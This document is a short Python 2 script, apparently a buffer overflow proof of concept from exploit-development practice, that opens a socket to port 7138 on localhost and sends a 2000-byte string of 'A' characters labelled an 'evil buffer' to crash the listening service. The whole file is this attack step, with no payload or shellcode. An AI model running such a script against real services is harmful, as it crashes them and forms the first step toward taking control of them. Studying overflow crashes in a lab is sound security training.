#!/usr/bin/python
import socket
import sys

try:
  print "\nSending evil buffer..."
  buffer = "A" * 2000

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

  s.connect(("127.0.0.1", 7138))
  s.send(buffer + '\r\n')
  s.close()

except:
  print "\nCould not connect!"
  sys.exit()
